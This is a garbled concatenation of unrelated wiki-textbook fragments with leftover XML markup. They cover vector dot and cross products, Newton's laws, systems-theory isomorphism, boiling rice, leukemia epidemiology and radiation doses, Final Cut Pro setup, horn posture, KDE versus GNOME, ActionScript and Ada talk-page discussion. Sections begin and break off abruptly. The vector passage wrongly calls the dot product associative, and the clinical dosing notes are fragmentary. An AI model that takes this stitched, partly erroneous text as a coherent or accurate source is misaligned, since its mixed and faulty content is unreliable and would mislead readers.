&lt;math&gt;\vec{A}\cdot(\vec{B}+\vec{C})=\vec{A}\cdot\vec{B}+\vec{A}\cdot\vec{C}&lt;/math&gt;

&lt;math&gt;\vec{A}\times(\vec{B}+\vec{C})=\vec{A}\times\vec{B}+\vec{A}\times\vec{C}&lt;/math&gt;

&lt;math&gt;(\vec{A}+\vec{B})\times\vec{C}=\vec{A}\times\vec{C}+\vec{B}\times\vec{C}&lt;/math&gt;

The dot product of two vectors is proportional to the cosine of the angle between them, and their cross product is proportional to the sine of the angle between them.

&lt;math&gt;\vec{A}\cdot\vec{B}=\|\vec{A}\|\|\vec{B}\|\cos(\theta)&lt;/math&gt;

&lt;math&gt;\|\vec{A}\times\vec{B}\|=\|\vec{A}\|\|\vec{B}\|\sin(\theta)&lt;/math&gt;

As we have seen already, the dot product is associative and commutative.

&lt;math&gt;\vec{A}\cdot(\vec{B}\cdot\vec{C})=(\vec{A}\cdot\vec{B})\cdot\vec{C}&lt;/math&gt;

&lt;math&gt;\vec{A}\cdot\vec{B}=\vec{B}\cdot\vec{A}&lt;/math&gt;

It is important to remember that the cross product has neither of these properties. Instead of being commutative, it is anticommutative.

&lt;math&gt;\vec{A}\times\vec{B}=-\vec{B}\times\vec{A}&lt;/math&gt;

The cross product is not even associative. For example, consider &lt;math&gt;(\vec{A}\times\vec{A})\times\vec{B}&lt;/math&gt;. Since the sine of the angle between &lt;math&gt;\vec{A}&lt;/math&gt; and itself is 0, &lt;math&gt;\vec{A}\times\vec{A}=\vec{0}&lt;/math&gt;, and so &lt;math&gt;(\vec{A}\times\vec{A})\times\vec{B}=\vec{0}&lt;/math&gt;. On the other hand, &lt;math&gt;\vec{A}\times(\vec{A}\times\vec{B})&lt;/math&gt; is not zero, since &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{A}\times\vec{B}&lt;/math&gt; are perpendicular. In fact, if &lt;math&gt;\vec{A}&lt;/math&gt; and &lt;math&gt;\vec{B}&lt;/math&gt; were perpendicular, its direction would be opposite to that of &lt;math&gt;\vec{B}&lt;/math&gt;. Check this yourself using the right hand rule.

The component of &lt;math&gt;\vec{A}&lt;/math&gt; parallel to &lt;math&gt;\vec{B}&lt;/math&gt; is given by

&lt;math&gt;\left(\frac{\vec{B}\cdot\vec{A}}{\vec{B}\cdot\vec{B}}\right)\vec{B}&lt;/math&gt;

and the perpendicular component of &lt;math&gt;\vec{A}&lt;/math&gt; is given by 

&lt;math&gt;\left(\frac{\vec{B}\times\vec{A}}{\vec{B}\cdot\vec{B}}\right)\times\vec{B}&lt;/math&gt;.

This leads to some interesting properties involving combinations of the products, such as

&lt;math&gt;(\vec{B}\cdot\vec{B})\vec{A}=(\vec{A}\cdot\vec{B})\vec{B}+(\vec{B}\times\vec{A})\times\vec{B}&lt;/math&gt;,

&lt;math&gt;\vec{A}\times(\vec{B}\times\vec{C})=(\vec{A}\cdot\vec{C})\vec{B}-(\vec{A}\cdot\vec{B})\vec{C}&lt;/math&gt;, and

&lt;math&gt;(\vec{A}\times\vec{B})\cdot(\vec{C}\times\vec{D})=(\vec{A}\cdot\vec{C})(\vec{B}\cdot\vec{D})-(\vec{A}\cdot\vec{D})(\vec{B}\cdot\vec{C})&lt;/math&gt;.

      <text xml:space="preserve">'''Newton's laws''' describe what causes motion of objects. There are three laws, which can be briefly stated:

* First law: In an inertial reference frame, unless acted on by a net force, an object at rest stays at rest.
* Second law: In an inertial reference frame, force is equal to mass times acceleration (&lt;math&gt;\vec{F} = m \vec{a}&lt;/math&gt;)
* Third law: For every force, there is an equal and opposite reaction force (&lt;math&gt;\vec{F}_{\mathrm ab} = - \vec{F}_{\mathrm ba}&lt;/math&gt;)

Each of these laws will be discussed in more detail in each section.

== Isomorphism ==

Isomorphism is the formal mapping between complex structures where the two structures contain equal parts. This formal mapping is a fundamental premise used in mathematics and is derived from the Greek words Isos, meaning equal, and morphe, meaning shape. Identifying isomorphic structures in science is a powerful analytical tool used to gain deeper knowledge of complex objects. Isomorphic mapping aids biological and mathematical studies where the structural mapping of complex cells and sub-graphs is used to understand equally related objects.

== Isomorphic Mapping ==

Isomorphic mapping is applied in systems theory to gain advanced knowledge of the behavior of phenomena in our world. Finding isomorphism between systems opens up a wealth of knowledge that can be shared between the analyzed systems. Systems theorists further define isomorphism to include equal behavior between two objects. Thus, isomorphic systems behave similarly when the same set of input elements is presented. As in scientific analysis, systems theorists seek out isomorphism in systems so to create a synergetic understanding of the intrinsic behavior of systems. Mastering the knowledge of how one system works and successfully mapping that system’s intrinsic structure to another releases a flow of knowledge between two critical knowledge domains.  Discovering isomorphism between a well understood and a lesser known, newly defined system can create a powerful impact in science, medicine or business since future, complex behaviors of the lesser understood system will become revealed.

== Methods ==

General systems theorists strive to find concepts, principles and patterns between differing systems so that they can be readily applied and transferred from one system to another. Systems are mathematically modeled so that the level of isomorphism can be determined. Event graphs and data flow graphs are created to represent the behavior of a system. Identical vertices and edges within the graphs are discovered to identify equal structure between systems. Identifying this isomorphism between modeled systems allows for shared abstract patterns and principles to be discovered and applied to both systems. Thus, isomorphism is a powerful element of systems theory which propagates knowledge and understanding between different groups. The archive of knowledge obtained for each system is increased. This empowers decision makers and leaders to make critical choices concerning the system in which they participate. As future behavior of a system is more well understood, good decision making concerning the potential balance and operation of a system is facilitated.

== Uses ==

Isomorphism has been used extensively in information technology as computers have evolved from simple low level circuitry with a minimal external interface to highly distributed clusters of dedicated application servers. All computer scientific concepts are derived from fundamental mathematical theory. Thus, isomorphic theory is easily applied within the computer science domain. Finding isomorphism between lesser undeveloped and current existing technologies is a powerful goal within the IT industry as scientists determine the proper path in implementing new technologies. Modeling an abstract dedicated computer or large application on paper is much less costly than building the actual instance with hardware components. Finding isomorphism within these modeled, potential computer technologies allows scientists to gain an understanding of the potential performance, drawbacks and behavior of emerging technologies. Isomorphic theory is also critical in discovering “design patterns” within applications. Computer scientists recognized similar abstract data structures and architecture types within software as programs migrated from low level assembler language to the currently used higher level languages. Patterns of equivalent technical solution architectures have been documented in detail. Modularization, functionality, interfacing, optimization, and platform related issues are identified for each common architecture so to further assist developers implementing today’s applications. Examples of common patterns include the “proxy” and “adapter” patterns. The proxy design pattern defines the best way to implement a remote object’s interface, while the adapter pattern defines how to build interface wrappers around frequently instantiated objects. Current research into powerful, new abstract solutions to industry specific applications and the protection of user security and privacy will further benefit from implementing isomorphic principles.

== Comparing real vs model ==

The most powerful use for isomorphic research occurs when comparing a synthetic model of a natural system and the real existence of that system in nature. System theorists build models to potentially solve business, engineering and scientific problems and to gain a valid representation of the natural world. These models facilitate understanding of our natural phenomena. Theorists work to build these powerful isomorphic properties between the synthetic models they create and real world phenomena. Discovering significant isomorphism between the modeled and real world facilitates our understanding of the our own world. Equal structure must exist between the man-made model and the natural system so to ensure an isomorphic link between the two systems. The defined behavior and principles built inside the synthetic model must directly parallel the natural world. Success in this analytical and philosophical drive leads man to gain a deeper understanding of himself and the natural world he lives in.</text>

      <text xml:space="preserve">{{technique}}

The simplest way of cooking rice as a part of a main meal is to boil it. There are two main methods: the absorption technique, and the free simmering technique.

==Absorption==
This you need to experiment to get the amounts and time correct. Here's the technique that works for [[Cookbook:Basmati rice|Basmati rice]]

*Measure the rice into a saucepan that is at least four times as big as the amount of rice you need. 
*Wash the rice: nearly fill the saucepan with water, and stir the rice. The water should become somewhat cloudy as some of the starch is washed off the rice. Drain the water, and repeat a few times until the water is (almost) clear. 
*Drain the rice. You don't have to be too exact about this.
*Add cold water to the pan - about double the volume of the rice.
*Add a pinch of salt (amount depending on the amount of rice) and any other flavourings. (A crushed [[Cookbook:Cinnamon|cinnamon]] blade is nice.)
*Bring the rice to the boil, cover the pan, and let it [[Cookbook:Simmering|simmer]] for ten minutes.
*Turn off the heat, and let the rice stand for five minutes to absorb any remaining water and become soft.

This technique works for different kinds of rice but you need to work out by trial and error how much water to add, and how long to let the rice simmer. Instead of water you can use [[Cookbook:Stock|stock]] to flavour the rice.

==Free simmering==
This is a much simpler technique.

*Fill a large pot with water (at least five times the amount of rice to be cooked) and bring to a boil.
*While the water is coming to a boil, wash the rice (as above)
*When the water boils, add salt to taste and add rice.
*Boil the rice gently until it is cooked to a firmness you like (boil until swollen). Do not stir while boiling. Do not over cook (do not cook so long that it bursts).
*Drain as gently as possible (do not stir), cover, and allow to &quot;soak.&quot; Lining the inside of the lid with a cloth or paper towel assists in achieving fluffy rice.
*It can soak off heat for 10 minutes or so and be ready to be fluffed with a fork and served. Or it can soak on very low heat for up to an hour, if necessary.</text>

==Epidemiology==
Leukemias are the most common cancer of childhood and the number one cause of cancer related death in children. 32% of cancers in children under 15.  This varies by year, with leukemia representing 17% of cancers in the first year of life, peaking at 46% for 2-3 year olds, and 9% for nineteen year olds.  Total cases of leukemia is 7.24 per 100,000 for age 0-5, 3.8 per 100,000 for ages 5-9, decreasing to about 2.5 for ages 10-19.

Incidence in Children: (SEER 1975-1995, age-adjusted)
*Acute lymphoblastic leukemia - 2.9 per 100,000
**74% of leukemias in children. Incidence decrease
**Burkitt's lymphoma and lymphoblastic lymphoma are now considered forms of ALL.
*Acute myeloid leukemia - 0.52 per 100,000
**about 14% of leukemias in children; 
*Chronic myeloid leukemia - 0.13 per 100,000 (less than 7% of childhood leukemias)
*Chronic lymphocytic leukemia - rare (about 0.02 per million)
*Others - rare

ALL and AML have the incidence at younger ages (&lt;5 years) then decrease. AML incidence rises after age 10, causing 36% of leukemias at age 15-19, but ALL is still the most common leukemia in the older age group (50%). 

Incidence in Adults: (SEER 1997-2001, age-adjusted)
*Chronic lymphocytic leukemia - 3.53 per 100,000
**increases sharply with age - 0.78 (age 20-54), 7.34 (55-64), 15.1 (65-74), 24.9 (75+)
**median age 60 yo
**higher in males by about 2:1. somewhat higher in whites than blacks.
**5-15% will evolve into a more aggressive lymphoid malignancy
*Acute myeloid leukemia - 3.77 per 100,000
**increases sharply with age - 1.66 (age 20-54), 5.9 (55-64), 13.8 (65-74), 21.7 (75+)
**higher in males by about 2:1. somewhat higher in whites than blacks
*Acute lymphocytic leukemia - 1.5 per 100,000
**incidence increases slightly with age but highest in childhood
**somewhat higher in males than females, whites than blacks
*Chronic myeloid leukemia - 1.6 per 100,000
**increases with age
**higher in males than females (by about 1.5:1). somewhat higher in whites than blacks

==Risk of Relapse==

*Biological
**Histology/immunophenotype
**Cytogenetics
**Gene identification
*Response based
**Morphology (BM Bx/aspirate)
**Minimal Residual Disease
*Lymphomatous presentation (PMID 1855175)

'''''Risk groups:'''''
*Low - age 2-9 inclusive, WBC &lt; 10,000; no L2 morphology and boys with plts &lt; 100,000
*Intermediate - all others; includes pts who are low risk but have L2 morphology or boys with plts &lt; 100,000
*High - WBC &gt; 50,000; pts who are intermediate risk but have L2 morphology

'''''Adults with ALL:'''''
*'''High risk:''' age &gt; 35, WBC &gt; 30,000, null cell phenotype, Ph+, remission after more than 4 weeks of intensive chemo
*:Have a 18-28% chance of continuous CR at 5 yrs
*Regular risk
*:60% 5-yr DFS

== CNS disease ==
See also: [[Radiation Oncology/CNS/CSF involvement]]

CNS 1 - Negative cytology (no blasts)
&lt;br&gt;CNS 2 - +cytology, &lt; 5 WBC/microliter
&lt;br&gt;CNS 3 - +cytology, &gt;=5 WBC/microliter, or any CN lesion

*Gilchrist 1994

CNS involvement at diagnosis in 3% of children with ALL.
&lt;br&gt;CNS involvment is more common in ALL, rare in AML (except for the variant acute myelomonocytic leukemia, AMML), and rare in CML and CLL. Risk in AMML is 20%. 5-10% risk in adults with ALL.

==Roles for Radiation==

*CNS prophylaxis
*CNS Therapy (active disease)
*TBI
*Testis prophylaxis(sanctuary sites)
*Palliation
*Treatment of [[Radiation Oncology/Chloroma|chloromas]]

==BMT==

Indications for allogeneic hematopoietic stem cell transplantation (HSCT):
*relapse, unfavorable cytogenetics, induction failure.

High risk patients (relapsed or t(9;22) (Philadelphia) may benefit from BMT

Conditioning regimens prior to HSCT: purpose is to prevent graft rejection and eliminate leukemic cells. Regimen may consist of  chemotherapy alone or chemotherapy + TBI. There is a suggestion of improved outcomes with TBI.

TBI - Socié et al, Blood 2001

==CNS prophylaxis==

Indications:
*CNS involvement at time of diagnosis
*High risk disease
**&lt;1 yo, &gt;10 yo
**WBC &gt; 100,000
**T-cell ALL with WBC &gt; 50,000
**bcr-abl translocation (Philadelphia chromosome)
**lymphomatous presentation

PCI for CNS prophylaxis as frontline treatment for patients with ALL led to an increase in survival in the 1960s. Toxicity from PCI is significant. Earlier trials used 24 Gy. Later trials showed that the dose can be reduced to 12-18 Gy or eliminated entirely if appropriate systemic and intrathecal chemotherapy is used.

==Treatment of CNS disease==
:See also: [[Radiation Oncology/CNS/CSF involvement]]
Therapeutic Cranial Irradiation
-5% of those on initial presentation
-CNS failure

See appropriate protocol for chemotherapy regimen, individual risk-adapted, and response criteria to stratify by risk category.

*Dose
**Varies on protocol
**24 Gy in past, no longer used.
**18 Gy (standard dose) associated with decreased risk of CNS complications

'''''Treatments:'''''
&lt;br&gt;CCG trials from 1971-78 used cranial RT + intrathecal MTX but no spinal RT. 
&lt;br&gt;CSI was found to be more effective than cranial RT in treating pts with CNS relapse. (Willougby, MRC, PMID 816410, 1976)
&lt;br&gt;CCG trials from 1978-83 used 24 Gy cranial + 12 Gy spinal given during consolidation phase along with systemic and intrathecal chemo.
:CNS disease at diagnosis was not an independent prognostic factor, thereby indicating the effectiveness of CNS treatment regimens used.  
CCG trials from 1983-89 used more intensive chemotherapy. Reduced spinal dose to 6 Gy in those treated with intensive consolidation phase in order to limit hematopoietic toxicity.

**Retrospective. 371 patients with leukemia diagnosis, &lt;16 years old, born 1974-1986. Five matched controls from Population Registry of Finland. Information on 9th grade school analyzed
**If cranial irradiation: lower overall marks (mean -0.24 on scale 4-10), and lower marks for all school subjects
**If chemo alone: females &lt;7 at diagnosis had worse school marks
**Conclusion: Cranial irradiation impairs scholastic achievement; also chemo alone in females before school age

This book is intended to be a guide for anybody who wants to learn more about Final Cut Pro.  It is a tutorial, and an alternative to a typical book that one might find on a brick and mortar bookstore shelf for approximately $50.  Ideally, it is part of a series of computer manuals that will increase the technical capabilities of individuals interested in all forms of electronic and computer media.

Anybody is welcome to add their thoughts to this book. Newbies, amateurs, and professionals all have content that will help flesh this book out and make it complete.

A [[w:wikibook|wikibook]] is a community project.  This is a book that requires a substantial amount of time and energy to complete.  It can benefit greatly from even modest contributions from readers and editors. For example, even as a reader, you can fix bugs and typos in the text in order to improve the book. If you find an opportunity to make a correction or improvement, simply click &quot;edit,&quot; make your changes, and click save. Other users, especially those who have devoted large amounts of energy and time to this book and the wiki world in general, will eventually review your changes and confirm their appropriateness.

If you are unsure of how you can help, you can visit the &quot;discussion&quot; page and ask there. In general, to make a small change, you don't need to ask first, and you can just use common sense to determine if your change is appropriate.  We trust your judgment.

A large portion of this book will eventually utilize screen captures.  As you contribute, please don't let your lack of screen captures deter you from contributing portions of text that would benefit from eventual images.

==History==
Please see the wikipedia entry for [[w:Final Cut Pro|Final Cut Pro]] for a short history of Final Cut Pro and how the software came to be.

==Linear Editing==

In the early days of film, editors literally made cuts in film when performing an edit.  They would then tape or splice another segment of film onto the cut.  Film editing was originally non-linear, an editor could place any amount of film in between any two frames and it would still be playable.  When editing moved to video, the process became linear.  One could only edit in one direction in the timeline.  The editor would start with a clip, then add a second clip to the end of the first clip, then add another to the end and so on until the video was completed.  If the editor wanted later to add a clip between the second and third clips, for instance, he would have to record everything again after the newly inserted clip, for this clip would be over the original editing. 


Just think about using a typewriter (if you remember those) instead of a text-editing software:  You should either retype the whole page again or erase the third and subsequent paragraphs, insert the new one, and then rewrite everything from the third paragraph on.  A typewriter would be a &quot;linear&quot; writing machine where any computer with a text editing software (where you can cut, copy, paste, edit your text easily) would be &quot;non-linear&quot;.


Now, the non-linear process is available to video as well as film.

==Format==

This book will begin by focusing on the DV (miniDV and DVCAM) format, as it is the most common format used by Final Cut Pro users.  The firewire 400 cable that connects a DV deck or DV camera to an Apple computer enables users to edit without any additional hardware.  Eventually, we will compose additional chapters or supplements to chapters that will encompass additional formats.

Correct '''posture''' is important to comfortably producing a good tone on the horn, as with any wind instrument. Using a poor posture can result in wavering pitch, inadequate air support, pinched or hollow sound, and various other playing difficulties.

While playing, the player's back and neck must always be in line. It is recommended that hornists (and most wind instrumentalists) sit with their backs off the back of the chair and feet flat on the floor for a slight &quot;leaning forward&quot; feeling. The most important thing to remember is that the posture must be as upright as possible without causing any excess tension; the entire body must be as relaxed as possible to avoid tension creeping into the sound.

Only the tips of the fingers should be placed on the valve levers.  This allows for faster depression of valves, allowing the player to change pitches properly.

Correct posture will allow one to adjust dynamics more correctly and produce a better sound.

      <format>text/x-wiki</format>
      <text xml:space="preserve">Final Cut Pro's standard view consists of four main windows: the ''browser'' (in the top-left corner by default), the ''viewer'' (in the top middle, by default), the ''canvas'' (top right, by default) and the ''timeline'' (at the bottom).

==The Browser==
As in most digital non-linear editing applications, the Browser is not an interface to the computer's [[filesystem]]. It is an entirely virtual space in which references to clips (aliases) are placed, for easy access, and arranged in folders called 'bins'. Since they are only references to clips that ''are'' on the media drive of the computer, moving or deleting a source file on the media hard drive destroys the link between the entry in the Browser and the actual media. This results in a 'media offline' situation, and the media must be 'reconnected'. Final Cut Pro can search for the media itself, or the user can do this manually. If multiple clips are offline at the same time, Final Cut can reconnect all the offline media clips that are in the relative directory path as the first offline media clips that is reconnected.

The Browser contains two type of tabs, one for projects and one for effects.  They both behave like an explorer window. The projects tab will show the various bins, media, clips, and sequences that you have imported into Final Cut, along with any associated information.  Column headings are very versatile and able to be rearranged.  By clicking and dragging, you can move entire column headings around. 

You can also have multiple projects open at once.  Every project will open under a separate tab.  By clicking and dragging the project tab outside of the browser window, you can make the tab independent of the browser.  This is useful for sharing media between multiple projects.  

The Effects tab is the other available tab in the Browser window.  Take a look and orient yourself with the various filters and transitions available in the sub folders.  In order to use each effect, you can simply click and drag the filters to media in the Timeline.

==Viewer==
The viewer has tabs for each channel of the selected clip's audio, in which the waveform for the audio can be viewed and scrubbed, and where its volume can be keyframed. The filters tab is where effects for the clip appear and where their parameters can be adjusted and keyframed. If the clip selected is a generator (such as an oval shape), a control tab appears for changing its geometrical properties. Finally, the viewer's motion tab contains tools to adjust the scale, opacity, [[w:cropping (image)|cropping]], rotation, distortion, [[w:drop shadow]], [[w:motion blur]] and time remapping properties of the clip. Mini-timelines to the right of each parameter allow the property to be keyframed.

==Canvas==
The canvas outputs the contents of the Timeline. To add clips to the Timeline, besides dragging them there, it is possible to drag clips from the Browser or Viewer onto the Canvas, where the 'edit overlay' is displayed. The edit overlay has seven drop zones, into which clips can be dragged in order to perform different edits. The default is the 'overwrite' edit, which overwrites at an in point or the space occupied after the playhead with the incoming clip. The 'insert' edit slots a clip into the sequence at the in point or playhead's position, keeping the rest of the video intact, but moving it all aside so that the new clip fits. There are also drop zones to have the application automatically insert transitions. The 'replace' edit replaces a clip in the Timeline with an incoming clip, and the 'fit to fill' edit does the same thing, but at the same time, it adjusts the playback speed of the incoming clip so that all of it will fit into the required space [in the Timeline]. Finally there is the 'superimpose' edit, which automatically places the dropped clip on the track above the clip in the Timeline, with a duration equal to the clip below it. Unless an in or out point are set, all edits occur from the position of the playhead in the Timeline.

Using the wireframe view on the canvas, the clip can be manipulated directly - dragging it around in the canvas to change its position, for example, or resizing it. Precise adjustment controls for these things are in the viewer.

==The Timeline==

      <text xml:space="preserve">*In terms of the basic desktop layout, [[Using KDE|KDE]] more-closely follows a [[Windows]] style with a taskbar, start menu, and various other things. On the other hand, [[GNOME]] takes the Mac OS X approach, placing the task bar on top of the screen and a separate bar for currently-open applications (the Task Bar).

*GNOME is built with the [[w:GTK|GTK toolkit]] while KDE uses [[w:Qt (toolkit)| Qt]].
*GNOME is mainly written in [[wikipedia:C programming language|C]] and KDE in [[wikipedia:C++|C++]].
*While KDE's interface is normally considered slicker and more polished to that of GNOME possibly due to the underlying Qt toolkit, GTK is a very popular toolkit for Linux and so most apps have better integration with GNOME.

ActionScript is a scripting language developed by [http://www.adobe.com Adobe] (formerly [http://www.macromedia.com Macromedia]) for its Flash animation studio. ActionScript is similar to JavaScript with its syntax and functionality. The latest version, ActionScript 3.0, released together with Flash CS3, emphasizes [[Object Oriented Programming|Object oriented programming]] more so than previous versions. ActionScript is a proprietary language designed to control animations and create advanced interactive applications such as slide-shows, games, quizzes, tutorials, and websites. ActionScript 3.0 has grown substantial capabilities in comparison with previous versions. ActionScript may be difficult to learn for beginners with no programming experiencing, however, it becomes easier to grasp with repeated practice and use.

This tutorial is designed for use with Actionscript 2.0.  Changes for ActionScript 3.0 will be listed as well.

      <text xml:space="preserve">Thank you very much for your contribution to the introduction to the course on the history of Ancient Philosophy. I feel that it is in fact a very good starting point. I like the way you mention the fact that we do not usually pay enough attention to eastern philosophy in the west.&lt;br /&gt;I have written a small article on the history of Japanese philosophy, and I will include it shortly. I hope we receive some contributions on the history of Chinese and Indian philosophy. This could hopefully give readers an overview of a philosophical tradition that has been greatly neglected in the west.([[User:Alex beta|Alex beta]] 10:37, 7 Mar 2005 (UTC))</text>

* IMHO it should be better (more understandable) to use an English word to show the use of 32 bits identifiers. The identifier &lt;tt&gt;Übertrag&lt;/tt&gt; is not very useful for non german speakers. Something like ''Déjà vu'', but that sounds like a common name for an identifier. Or maybe the example could simply be the definition of constant Pi in &lt;tt&gt;Ada.Numerics&lt;/tt&gt;  
-- [[User:Suruena|suruena]] 11:54, 7 Mar 2005 (UTC)


* As far as I know these two examples are already possible in Ada 95, since [[w:Latin-1|ISO Latin-1]] has to be supported in identifiers. Will be &amp;euro; supported? That would be a good example:
 type Price_In_&amp;euro; is delta 0.01 digits 8;
-- [[User:ManuelGR|ManuelGR]] 20:46, 8 Mar 2005 (UTC)


* It's true, both ''Übertrag'' and ''Déjà vu'' are allowed in Ada 95, so we must change that example. I don't known whether ''Price_In_&amp;euro;'' is a legal Ada 2005 identifier (''Price_In_$'' is not), but at least it is not rejected by GCC 3.4.3 (using switches &lt;tt&gt;-gnatiw -gnatW8&lt;/tt&gt; for [[w:UTF-8|UTF-8]] character set). Anyway, until we are sure the euro sign is valid in identifiers I would use another example, like putting the standard constant Pi and saying that russians and indians will be able to use their mother tonge in Ada.

== Ada 200Y ==

As stated in the [http://www.adaic.com/standards/articles/ada06-faq.html Ada 2006 FAQ], the &quot;nickname&quot; of the next revision of Ada isn't clear yet (the community decides this name, and there is no agreement). The new standard probably will be accepted in early 2006, however some voices are saying that the name should be Ada 2005 because it has been named that way during some time, and because ''Ada 2006'' do not sounds well. I don't have any preferences, but IMHO maybe we should put every reference to the next revision simply as &quot;Ada 200Y&quot;, explaining in this page that the nickname isn't decided yet. --[[User:Suruena|surueña]] 11:23, 2005 Jun 5 (UTC)

:For new content, I agree in using Ada 200Y. For the current content I suggest to wait how it evolves before changing anything. [[User:ManuelGR|ManuelGR]] 19:46, 5 Jun 2005 (UTC)

According to the &quot;Rationale for Ada 2005&quot; published in [http://www.adacore.com/ada_2005.php http://www.adacore.com/ada_2005.php] (right box):

:''This is currently being reviewed and the final approved standard should emerge in the first half of 2006. There has been much discussion on whether the language should be called Ada 2005 or Ada 2006. For various reasons the WG9 meeting in York in June 2005 decided that the vernacular name should be Ada 2005.''

So we should not take the contrary to the WG9. Now it is clear that the standard will be published in 2006 but the language will preserve its currently popular name. I will undo my changes, so all the references go back to Ada 2005. [[User:ManuelGR|ManuelGR]] 19:14, 14 July 2005 (UTC)

== contents structure, library ==

The nesting level of Library seems broken.
I feel guilty of that. Could someone in the know
have a look, and get things right again?

The programs' sources could be compiled but they aren't on
sf. I'm not yet familiar with how one arranges that.
I could send a .tar if anyone wants it.

[[User:GeorgBauhaus|gb]]

:The nesting level is now fixed, I have removed a minor section title because there was too much nesting. About Sourceforge, you can become a member of the [https://sourceforge.net/projects/wikibook-ada/ project] and then you can upload all the sources you want, otherwise you can send to me the examples (using the &quot;E-mail this user&quot; link on my userpage [[User:ManuelGR|ManuelGR]]) and I will upload them to the CVS. [[User:ManuelGR|ManuelGR]] 16:17, 23 October 2005 (UTC)

== bean counting algorithm ==

actually, the introductory paragraph at the start of the bean counting
subjection states an exercise that is more extensive than its semi-solution.
It's a WiKi, o.K.? :-)

[[User:GeorgBauhaus|gb]]

:this is now fixed. [[User:GeorgBauhaus|gb]] 02:55, 1 November 2005 (UTC)

== Container Lib ==

Well, while a description of the container lib was in desperate need I think it would better be placed in either in the Library section ot the book [[Ada_Programming/Libraries/Ada.Containers]], [[Ada_Programming/Libraries/Ada.Containers.Vectors]] or inside a new feature page [[Ada_Programming/Containers]].

This is the &quot;overview&quot; page and the text is allready detailed for &quot;overview&quot;. Nothing wrong with detailed - it deserves it't own space

--[[User:Krischik|Krischik]]&amp;nbsp;&lt;sup&gt;[[User_talk:Krischik|T]]&lt;/sup&gt; 12:15, 3 November 2005 (UTC)

:I think so, it deserves its own space. Let's wait to hear what Georg Bauhaus thinks about it. [[User:ManuelGR|ManuelGR]] 19:40, 4 November 2005 (UTC)

::I agree. [[User:GeorgBauhaus|gb]] 18:31, 5 November 2005 (UTC)

Given that we all agree, I will copy the content to [[Ada_Programming/Containers]]. I think that one is the best page since the demo covers more than one container (so not for [[Ada_Programming/Libraries/Ada.Containers.Vectors]], [[Ada_Programming/Libraries/Ada.Containers.Maps]], etc) and it is more tutorial-oriented than reference-oriented, so not for the parent package [[Ada_Programming/Libraries/Ada.Containers]] either. Containers will be a main topic for Ada 2005 tutorials, won't they? [[User:ManuelGR|ManuelGR]] 22:46, 22 November 2005 (UTC)</text>

#Open Final Cut Pro.
#Click on FILE &gt; Save Project As
#Give your project a name.  We’ll name ours “First Project,” and we’ll save it under the Documents folder of the current user.


Final Cut Pro has an auto save feature that will prompt you to save your project if you haven’t already.  It can't perform an autosave unless the project has been saved at least once first.


When you open Final Cut Pro for the first time, you will encounter the Easy Setup Window, and you will be asked to choose a scratch disk.  For now, select DV NTSC for the Easy Setup, and set your scratch disk to an external hard drive or second hard drive.  If you don’t have an external or second hard drive, you can use your main/internal hard drive to edit your project.  Storing media on the main hard drive is not ideal; if you eventually fill up your hard drive, you can affect system performance, but it can be done.

      <text xml:space="preserve">There are two menus that are important to look at before you begin importing video and editing in the timeline: the ''User Preferences'' and the ''System Settings.''

First let's take a look at the ''User Preferences:''

Go to '''FINAL CUT PRO &gt; User Preferences'''

==User Preferences==
There are five tabs under the ''User Preferences'' control panel.
===General===
====Levels of Undo====
This can be set from 0 to 99.  The default is 10.  I generally prefer more than ten, but I also don’t need 99 levels of undo.  The higher the number you pick, the more memory you are devoting to saving your history of edits.  For now, set the ''Levels of Undo'' to 30
====List Recent Clips====
The list of recent clips pop up menu is located on the lower right corner of The Viewer window.  You can set this to be as high as 20, but the default of 10 clips is usually fine.
====Multi-Frame Trim Size====
This number determines how many frames forward or backward the trim buttons work in Trim Mode. Along with the multi frame button in Trim Mode, there will always be a +1 and -1 trim button, so feel free to try different number you feel might suit you.  You can set this to be as high as 99.  Try 10 to start.
====Real Time Audio Mixing====
The number of tracks that can be mixed and that you can listen to in real time is dependent on your processor speed, the number of audio filters used in your sequence, your hard disk data transfer rate, and the amount of memory allocated to Final Cut Pro.  This number can be set up to 99; its default is 8.  Typically eight is enough to begin projects with, although if you add a lot of sound effect tracks and music tracks, you may want to bump this number up to 10 or 12.  It is a handy adjustment to have available, but generally 8 is enough.
====Audio Playback Quality====
Unless you are performing a detailed audio mix at the end of your editing process, set this to ''low'' to enable you to hear the greatest number of mixed tracks and audio filters in real time.  When you are recording your sequence to tape, Final Cut Pro uses the high setting regardless of what you have selected for the playback quality. 
===Labels===
===Timeline Options===
===Render Control===
===Audio Outputs===
